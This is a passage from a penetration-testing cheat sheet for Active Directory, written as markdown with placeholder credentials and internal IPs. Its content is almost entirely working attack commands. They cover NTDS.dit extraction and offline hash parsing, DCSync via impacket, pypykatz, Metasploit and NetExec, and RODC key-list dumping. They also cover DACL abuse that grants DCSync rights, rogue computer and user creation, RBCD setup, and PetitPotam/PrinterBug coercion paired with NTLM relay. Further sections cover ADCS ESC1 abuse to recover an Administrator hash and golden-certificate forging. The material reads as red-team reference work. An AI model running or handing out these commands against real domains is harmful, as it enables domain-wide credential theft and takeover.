# smb: \> get Windows\Temp\ntds.dit ntds.dit
# smb: \> get Windows\Temp\SYSTEM SYSTEM

# Titanis — retrieve
Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
  -UserName Administrator@DOMAIN -Password Password123
Smb2Client get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
  -UserName Administrator@DOMAIN -Password Password123

# Step 5 — clean up shadow and parse offline
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "diskshadow.exe /s - delete shadows volume trophy"
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
gosecretsdump -ntds ntds.dit -system SYSTEM   # faster alternative for large NTDS files
```

[↑ Back to Index](#index)

---

### NTDS Dump via Kerb-Key-List (RODC)

> Extracts AES Kerberos keys for all domain accounts via the RODC key replication protocol. Requires the AES key or NT hash of an RODC `krbtgt` account (`krbtgt_XXXXX`). Does not use DRSUAPI or VSS — useful in environments where DCSync is blocked. Only recovers Kerberos keys, not NTLM hashes directly (though NTLM can be derived from RC4 keys).

```bash
# impacket — using RODC krbtgt AES key
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 \
  -use-keylist -rodcNo <RODC_number> \
  -rodcKey <rodc_krbtgt_aes256_hex>

# impacket — pass-the-hash to authenticate, then key-list
secretsdump.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  DOMAIN/Administrator@192.168.1.1 \
  -use-keylist -rodcNo <RODC_number> \
  -rodcKey <rodc_krbtgt_aes256_hex>
```

[↑ Back to Index](#index)

---

### NTDS Offline Parsing

> Given a stolen ntds.dit and SYSTEM hive (from VSS, IFM, backup, or backup-semantics pull), extract all hashes locally without touching the DC again.

```bash
# gosecretsdump — Go reimplementation; dramatically faster on large NTDS files
# (secretsdump can take 20+ minutes; gosecretsdump completes in under a minute)
gosecretsdump -ntds ntds.dit -system SYSTEM
gosecretsdump -ntds ntds.dit -system SYSTEM -enabled   # enabled accounts only
gosecretsdump -ntds ntds.dit -system SYSTEM -history   # include password history
gosecretsdump -ntds ntds.dit -system SYSTEM -out hashes.txt
```

[↑ Back to Index](#index)

---

### DCSync

> **Titanis status:** MS-DRSR not yet implemented. Use Metasploit, pypykatz, or impacket. Feed recovered hashes into Titanis PTH flows.

```bash
# pypykatz — full domain dump
pypykatz smb dcsync "smb2+ntlm-password://DOMAIN\Administrator:Password123@192.168.1.1"

# pypykatz — single user (less noisy)
pypykatz smb dcsync "smb2+ntlm-password://DOMAIN\Administrator:Password123@192.168.1.1" \
  --username krbtgt

# pypykatz — pass-the-hash
pypykatz smb dcsync \
  "smb2+ntlm-nt://DOMAIN\Administrator:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1"

# Metasploit — full domain dump
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.1 smbdomain=DOMAIN \
  smbuser=Administrator smbpass=Password123 action=DOMAIN

# Metasploit — restrict to specific users
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.1 smbdomain=DOMAIN \
  smbuser=Administrator smbpass=Password123 action=DOMAIN krb_users=krbtgt

# impacket — full NTLM dump
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 -just-dc-ntlm

# impacket — pass-the-hash
secretsdump.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  DOMAIN/Administrator@192.168.1.1 -just-dc-ntlm

# impacket — single account
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 \
  -just-dc-user DOMAIN/krbtgt

# NetExec
netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds --user krbtgt

# NetExec — pass-the-hash
netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --ntds
```

[↑ Back to Index](#index)

---

## 5. Enumeration

### Enumerate Domain Users (SAMR)

```bash
# impacket
samrdump.py DOMAIN/jdoe:Password123@192.168.1.10
net.py DOMAIN/jdoe:Password123@192.168.1.10 user

# enum4linux-ng
enum4linux-ng -U 192.168.1.10 -u jdoe -p Password123

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --users

# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumdomusers"

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> adinfo

# Titanis
Sam enumusers 192.168.1.10 -UserName jdoe -Password Password123
```

[↑ Back to Index](#index)

---

### Enumerate Groups / Local Aliases

```bash
# impacket — enumerate domain groups
net.py DOMAIN/jdoe:Password123@192.168.1.10 group

# impacket — enumerate local aliases (BUILTIN groups) on a host
net.py DOMAIN/jdoe:Password123@192.168.1.10 localgroup

# impacket — add/remove a user from a domain group
net.py DOMAIN/admin:Password123@192.168.1.10 group -name "Domain Admins" -join newuser
net.py DOMAIN/admin:Password123@192.168.1.10 group -name "Domain Admins" -unjoin newuser

# impacket — add/remove from a local alias (e.g. local Administrators)
net.py DOMAIN/admin:Password123@192.168.1.10 localgroup -name Administrators -join newuser
net.py DOMAIN/admin:Password123@192.168.1.10 localgroup -name Administrators -unjoin newuser

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --groups --local-groups

# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumdomgroups"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumalsgroups builtin"

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> adinfo

# bloodyAD — domain groups
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
  --filter "(objectClass=group)" --attr sAMAccountName,description,member

# Titanis
Sam enumgroups  192.168.1.10 -UserName jdoe -Password Password123
Sam enumaliases 192.168.1.10 -UserName jdoe -Password Password123
```

[↑ Back to Index](#index)

---

### SID Brute Force / Lookup

```bash
# impacket — brute force RIDs
lookupsid.py DOMAIN/jdoe:Password123@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --rid-brute

# enum4linux-ng
enum4linux-ng -R 192.168.1.10 -u jdoe -p Password123

# Titanis — resolve SID
Lsa lookupsid 192.168.1.10 -UserName jdoe -Password Password123 \
  S-1-5-21-1234567890-1234567890-1234567890-500

# Titanis — name to SID
Lsa lookupname 192.168.1.10 -UserName jdoe -Password Password123 Administrator jdoe
```

[↑ Back to Index](#index)

---

### Enumerate RPC Endpoints

```bash
# impacket
rpcdump.py DOMAIN/jdoe:Password123@192.168.1.10
rpcmap.py ncacn_ip_tcp:192.168.1.10

# Titanis
Epm lsep 192.168.1.10
```

[↑ Back to Index](#index)

---

### Query WMI

```bash
# impacket
wmiquery.py -query "SELECT * FROM Win32_Process" DOMAIN/jdoe:Password123@192.168.1.10

# impacket — pass-the-hash
wmiquery.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  -query "SELECT * FROM Win32_Process" DOMAIN/jdoe@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --wmi "SELECT * FROM Win32_Process"

# NetExec — pass-the-hash
netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  --wmi "SELECT * FROM Win32_Process"

# Titanis
Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  "SELECT * FROM Win32_Process"
Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  -OutputFields Caption,ProcessId,ParentProcessId "SELECT * FROM Win32_Process"
```

[↑ Back to Index](#index)

---

### WMI Method Invocation

```bash
# impacket — exec-based workaround only
wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "calc.exe"

# Titanis — invoke any WMI method directly
Wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  Win32_Process Create "calc.exe"
```

[↑ Back to Index](#index)

---

### Remote Registry Operations

```bash
# impacket — list key
reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
  -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion

# NetExec — read a registry value (via -x)
netexec smb 192.168.1.10 -u jdoe -p Password123 -x "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LsaCfgFlags"

# Titanis — list key
Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion

# impacket — read a value
reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
  -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v LsaCfgFlags

# Titanis — read a value
Reg get 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKLM/SYSTEM/CurrentControlSet/Control/Lsa LsaCfgFlags

# impacket — set a value
reg.py DOMAIN/jdoe:Password123@192.168.1.10 add \
  -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd "TestData"

# Titanis — set a value
Reg set 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKCU/Software/Test sz:TestValue=TestData
```

[↑ Back to Index](#index)

---

### Registry Key Security Descriptor

```bash
# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regetkeysecurity HKLM\\SAM"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regsetsecurity HKLM\\SAM <SDDL>"

# Titanis
Reg getsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 HKLM/SAM
Reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  HKLM/SAM "O:BAG:SYD:(A;;KA;;;SY)"
```

[↑ Back to Index](#index)

---

### Service Enumeration

```bash
# impacket
services.py DOMAIN/jdoe:Password123@192.168.1.10 list

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --services

# aiosmb — interactive client
asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
# smb> services
# smb> tasks

# Titanis — query all services
Scm query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123

# impacket — start / stop
services.py DOMAIN/jdoe:Password123@192.168.1.10 start -name Spooler
services.py DOMAIN/jdoe:Password123@192.168.1.10 stop  -name Spooler

# Titanis — start / stop
Scm start 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Spooler
Scm stop  192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Spooler

# Titanis — create / delete
Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc \
  "C:\Windows\System32\cmd.exe"
Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
```

[↑ Back to Index](#index)

---

### LSA Privilege Management

```bash
# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
  -c "lsaaddprivs S-1-5-21-...-1001 SeDebugPrivilege"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
  -c "lsadelprivs S-1-5-21-...-1001 SeDebugPrivilege"

# bloodyAD — no userRight subcommand; use rpcclient or Titanis for LSA privilege assignment

# Titanis
# ⚠️ Three requirements:
#   1. -PreferSmb required when targeting Domain Controllers (not needed for member servers)
#   2. -BySid required; -ByName is broken (LsaLookupNames always returns STATUS_OBJECT_NAME_NOT_FOUND)
#   3. Target account must have an existing LSA policy entry — run createaccount first if not
#
# Get SID first (impacket): lookupsid.py 'DOMAIN/admin:Pass@dc-ip' | grep <username>
#
# Step 1 — create LSA account entry if target has no existing explicit rights
Lsa createaccount 192.168.1.10 S-1-5-21-...-1001 \
  -UserName jdoe@DOMAIN -Password Password123 -PreferSmb
# Step 2 — add/remove privilege
Lsa addpriv  192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  -BySid S-1-5-21-...-1001 SeDebugPrivilege -PreferSmb
Lsa rmpriv   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  -BySid S-1-5-21-...-1001 SeDebugPrivilege -PreferSmb
Lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  -BySid S-1-5-21-...-1001 0x20 -PreferSmb
```

[↑ Back to Index](#index)

---

### LSA Privilege and Account Enumeration

```bash
# rpcclient
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "lsaenumsid"
rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumprivs"

# enum4linux-ng
enum4linux-ng -P 192.168.1.10 -u jdoe -p Password123

# Titanis
Lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123  # requires admin
Lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -Privilege SeDebugPrivilege
Lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
Lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
Lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
```

[↑ Back to Index](#index)

---

## 6. Active Directory / LDAP

### Enumerate AD Users / Computers

```bash
# impacket
GetADUsers.py    -all -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
GetADComputers.py     -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --users
netexec ldap 192.168.1.1 -u jdoe -p Password123 --computers

# bloodyAD
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search --filter "(objectClass=user)" --attr sAMAccountName,userPrincipalName,userAccountControl
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search --filter "(objectClass=computer)" --attr sAMAccountName,dNSHostName,operatingSystem

# msldap — password
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> adinfo

# msldap — pass-the-hash
msldap "ldap+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1"

# msldap — Kerberos ccache
msldap "ldap+kerberos+ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&ccache=jdoe.ccache"

# msldap — via SOCKS5
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080"

# Titanis — use Ldap query (not Ldap search) with -FollowReferrals on Linux
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)" -FollowReferrals
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)" -FollowReferrals
```

[↑ Back to Index](#index)

---

### GPO and Domain Trust Enumeration

```bash
# NetExec — BloodHound collection (includes GPOs and trusts)
netexec ldap 192.168.1.1 -u jdoe -p Password123 --bloodhound --collection All

# bloodyAD — domain trusts
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
  --filter "(objectClass=trustedDomain)" --attr name,trustDirection,trustType,flatName

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> trusts

# Titanis — enumerate GPO containers
# Use Ldap query + -FollowReferrals on Linux; -OutputFields comma list works on Windows only
# Linux: use -OutputStyle List and parse, or -OutputFields * and grep
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(objectClass=groupPolicyContainer)" \
  -OutputFields displayName,gPCFileSysPath,versionNumber -FollowReferrals

# Titanis — enumerate domain trusts
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(objectClass=trustedDomain)" \
  -OutputFields name,trustDirection,trustType,trustAttributes,flatName -FollowReferrals

# Titanis — Kerberos auth variants
Ldap query dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 \
  -Password Password123 "(objectClass=groupPolicyContainer)" \
  -OutputFields displayName,gPCFileSysPath -FollowReferrals
# ⚠️ -TicketCache only works with Titanis-native ccache; use -Tgt with a Titanis-generated TGT instead
# Ldap query dc01.domain.local -UserName jdoe@DOMAIN \
#   -TicketCache jdoe.ccache "(objectClass=trustedDomain)" -OutputFields * -FollowReferrals

# ldapsearch — raw GPO objects
ldapsearch -H ldap://192.168.1.1 -D "CN=jdoe,CN=Users,DC=domain,DC=local" -w Password123 \
  -b "CN=Policies,CN=System,DC=domain,DC=local" "(objectClass=groupPolicyContainer)" \
  displayName gPCFileSysPath
```

[↑ Back to Index](#index)

---

### Find Delegation Configurations

```bash
# impacket
findDelegation.py -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --trusted-for-delegation

# bloodyAD — unconstrained delegation
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
  --filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" --attr sAMAccountName,userAccountControl

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> unconstrained

# Titanis — unconstrained
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(userAccountControl|=TrustedForDelegation)" -OutputFields * -FollowReferrals

# Titanis — constrained
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(msDS-AllowedToDelegateTo=*)" -OutputFields * -FollowReferrals

# Titanis — S4U2self only
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(userAccountControl|=TrustedForS4U2self)" -OutputFields * -FollowReferrals
```

[↑ Back to Index](#index)

---

### Add a Computer Account

> **⚠️ LDAPS channel binding:** DCs with LDAP channel binding enforced (`LdapEnforceChannelBinding = 1`, default on Server 2019+) reject LDAPS binds that do not include a channel binding token. Neither impacket `addcomputer.py -method LDAPS` nor Titanis `Ldap addcomputer -Ssl` send a channel binding token — both fail with `invalidCredentials` / error 49 even with correct credentials. Use `bloodyAD` (which handles channel binding) or the `-method SAMR` fallback (plain SMB, no TLS required):

```bash
# impacket — SAMR method (no LDAPS required; works without channel binding)
addcomputer.py -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# impacket — LDAPS method (fails if DC enforces channel binding)
addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# impacket — pass-the-hash (SAMR)
addcomputer.py -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -dc-ip 192.168.1.1 DOMAIN/jdoe

# bloodyAD — handles channel binding; preferred LDAPS path
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add computer EVILPC$ Password123!

# NetExec
netexec smb 192.168.1.1 -u jdoe -p Password123 -M add-computer -o NAME=EVILPC$ PASSWORD=Password123

# Titanis — fails if DC enforces LDAPS channel binding
Ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$ Password123
```

[↑ Back to Index](#index)

---

### Add a User Account

```bash
# impacket — net.py does NOT support user -add; use bloodyAD or netexec instead
# (net.py only supports user -list, -enable, -disable; creation via SAMR is not implemented)

# bloodyAD — password
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add user newuser Password123!

# bloodyAD — pass-the-hash
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  add user newuser Password123!

# net rpc (Samba)
net rpc user add newuser Password123! -U DOMAIN/jdoe%Password123 -S 192.168.1.10

# Titanis
Ldap adduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 newuser Password123!
```

[↑ Back to Index](#index)

---

### Set RBCD

```bash
# impacket
rbcd.py -delegate-from EVILPC$ -delegate-to TARGET$ -action write \
  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# impacket — pass-the-hash
rbcd.py -delegate-from EVILPC$ -delegate-to TARGET$ -action write \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -dc-ip 192.168.1.1 DOMAIN/jdoe

# bloodyAD
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 set object TARGET$ \
  msDS-AllowedToActOnBehalfOfOtherIdentity -v '<SDDL>'
```

[↑ Back to Index](#index)

---

### DACL Abuse

> **Titanis status:** No ACE-write capability. `bloodyAD` is the preferred non-impacket option. `dacledit.py` / `owneredit.py` are the impacket fallbacks.

```bash
# bloodyAD — grant GenericAll
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass \
  add genericAll "CN=targetuser,CN=Users,DC=domain,DC=local" jdoe

# bloodyAD — grant DCSync rights
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass add dcsync jdoe

# bloodyAD — change owner
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass set owner targetuser jdoe

# bloodyAD — cleanup
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass \
  remove genericAll "CN=targetuser,CN=Users,DC=domain,DC=local" jdoe

# dacledit.py — grant DCSync
dacledit.py -action write -rights DCSync \
  -principal jdoe -target-dn "DC=domain,DC=local" \
  DOMAIN/admin:AdminPass@192.168.1.1

# dacledit.py — grant GenericAll
dacledit.py -action write -rights FullControl \
  -principal jdoe -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
  DOMAIN/admin:AdminPass@192.168.1.1

# owneredit.py — change owner
owneredit.py -action write -new-owner jdoe \
  -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
  DOMAIN/admin:AdminPass@192.168.1.1

# Titanis — post-exploitation after ACE grant (force password reset)
Kerb setpw -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
  targetuser@DOMAIN NewPass123
```

[↑ Back to Index](#index)

---

### User Attribute Modification (UAC Bitflags)

```bash
# impacket — enable / disable an account (net.py covers these two UAC bits directly)
net.py DOMAIN/admin:Password123@192.168.1.1 user -enable  targetuser
net.py DOMAIN/admin:Password123@192.168.1.1 user -disable targetuser

# bloodyAD — add UAC flag (enable AS-REP roasting)
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
  add uac targetuser -f DONT_REQ_PREAUTH

# bloodyAD — remove UAC flag (re-enable account)
bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
  remove uac targetuser -f ACCOUNTDISABLE

# Titanis
Ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  targetuser userAccountControl+=4194304
```

[↑ Back to Index](#index)

---

## 7. Auth Coercion

> Pair the coerce leg with `ntlmrelayx` or Responder for the relay leg. Titanis `credcoerce` covers MS-EFSR only.

```bash
# MS-EFSR — single technique
CredCoerce 192.168.1.10 \\<listener-ip>\share \
  -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile

# MS-EFSR — multiple techniques
CredCoerce 192.168.1.10 \\<listener-ip>\share \
  -UserName jdoe@DOMAIN -Password Password123 \
  -Techniques Efs.OpenFile,Efs.EncryptFile,Efs.DecryptFile,\
  Efs.QueryUsersOnFile,Efs.QueryRecoveryAgents,Efs.FileKeyInfo,\
  Efs.DuplicateEncryptionInfoFile

# MS-RPRN (PrinterBug) — no Titanis equivalent
printerbug.py DOMAIN/jdoe:Password123@192.168.1.10 <listener-ip>

# NetExec — coerce_plus covers all methods (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MSEven)
netexec smb 192.168.1.10 -u jdoe -p Password123 -M coerce_plus -o LISTENER=<listener-ip>
netexec smb 192.168.1.10 -u jdoe -p Password123 -M coerce_plus -o LISTENER=<listener-ip> METHOD=PrinterBug
netexec smb 192.168.1.10 -u jdoe -p Password123 -M coerce_plus -o LISTENER=<listener-ip> METHOD=PetitPotam

# MS-DFSNM (DFSCoerce) — no Titanis equivalent
python3 dfscoerce.py -d DOMAIN -u jdoe -p Password123 <listener-ip> 192.168.1.10

# MS-FSRVP (ShadowCoerce) — no Titanis equivalent
python3 shadowcoerce.py -d DOMAIN -u jdoe -p Password123 <listener-ip> 192.168.1.10
```

[↑ Back to Index](#index)

---

### Coerce + Relay Pattern

```bash
# Terminal 1 — relay listener (SMB)
ntlmrelayx.py -tf targets.txt -smb2support

# Terminal 1 — relay to LDAP for RBCD / shadow credentials
ntlmrelayx.py -t ldaps://192.168.1.1 --delegate-access --escalate-user jdoe

# Terminal 2 — trigger coercion
CredCoerce 192.168.1.10 \\<relay-listener-ip>\share \
  -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile
```

[↑ Back to Index](#index)

---

## 8. Certificates

### Self-Signed PFX Generation

```bash
# certipy — Golden Certificate from compromised CA key (requires -ca-pfx)
# Note: certipy forge cannot produce a self-signed cert without the CA private key;
#       for Shadow Credentials use certipy shadow or impacket's pyWhisker instead

# certipy — Golden Certificate from compromised CA key
certipy forge -upn Administrator@DOMAIN -ca-pfx ca.pfx -out admin.pfx

# openssl — generic PKI (not trusted by AD for PKINIT without NTAuth enrollment)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=jdoe"
openssl pkcs12 -export -out jdoe.pfx -inkey key.pem -in cert.pem -passout pass:Password123

# Titanis — works in interactive sessions (RDP/console); may fail in non-interactive sessions
Cert selfcert -Subject CN=jdoe -PfxFileName jdoe.pfx
```

[↑ Back to Index](#index)

---

### ADCS Certificate Template Enumeration

```bash
# certipy — includes ESC1–ESC8 vulnerability analysis
certipy find -dc-ip 192.168.1.1 -u jdoe@DOMAIN -p Password123 -vulnerable -stdout

# certipy — pass-the-hash
certipy find -dc-ip 192.168.1.1 -u jdoe@DOMAIN -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -vulnerable -stdout

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 -M adcs

# msldap — raw template list
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> certify
# msldap> certtemplates

# Titanis — enumerate certificate templates
Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  -OutputFields displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage

# Titanis — enumerate Enterprise CAs
Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKIEnrollmentService)" \
  -OutputFields displayName,dNSHostName,certificateTemplates

# ldapsearch
ldapsearch -H ldap://192.168.1.1 -D "CN=jdoe,CN=Users,DC=domain,DC=local" -w Password123 \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" displayName msPKI-Certificate-Name-Flag
```

[↑ Back to Index](#index)

---

### ADCS ESC1 — Enroll and Recover NT Hash

```bash
# Step 1 — enumerate vulnerable templates
certipy find -dc-ip 192.168.1.1 -u jdoe@DOMAIN -p Password123 -vulnerable -stdout

# Step 2a — request certificate with arbitrary UPN (certipy, HTTP/RPC enrollment)
certipy req -username jdoe@DOMAIN -password Password123 \
  -ca CA-NAME -template VulnerableTemplate \
  -upn Administrator@DOMAIN.LOCAL \
  -target ca.domain.local -out admin

# Step 2b — request certificate via SMB (aiosmb asmbcertreq — works when HTTP enrollment is firewalled)
asmbcertreq "smb+ntlm-password://DOMAIN\jdoe:Password123@ca.domain.local" \
  -ca "CA-NAME" -template "VulnerableTemplate" -upn "Administrator@DOMAIN.LOCAL" -out admin.pfx

# aiosmb — pass-the-hash
asmbcertreq "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@ca.domain.local" \
  -ca "CA-NAME" -template "VulnerableTemplate" -upn "Administrator@DOMAIN.LOCAL" -out admin.pfx

# Step 3a — certipy: recover NT hash + TGT
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL

# Step 3b — minikerberos: recover NT hash only
minikerberos-getNTPKInit \
  "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt

# Step 4 — Titanis PTH with recovered hash (use IP for Wmi exec; FQDNs fail at WMI DCOM activation)
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
  -NtlmHash <recovered_nt>
Reg dumpsam 192.168.1.1 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> -BackupSemantics
```

[↑ Back to Index](#index)

---

## 9. Exotic Credential Harvest

Techniques that produce equivalent credential coverage to an NTDS dump but bypass the standard mechanisms (DRSUAPI, VSS, NTDS file access) entirely. Useful when DCSync is blocked, VSS is monitored, or DA-level access is unavailable but ADCS or DPAPI trust paths exist.

---

### certsync — Golden Cert + UnPAC the Hash

> Dumps NT hashes for every domain user without DRSUAPI, VSS, or NTDS file access. Requires CA admin rights (or an exported CA cert + private key) and working PKINIT. Workflow: enumerate users from LDAP → dump CA cert/key → forge a certificate per user → UnPAC the hash via PKINIT for each. Produces secretsdump-format output. Not slower than DCSync in practice.

```bash
# certsync — password auth (auto-discovers CA from LDAP)
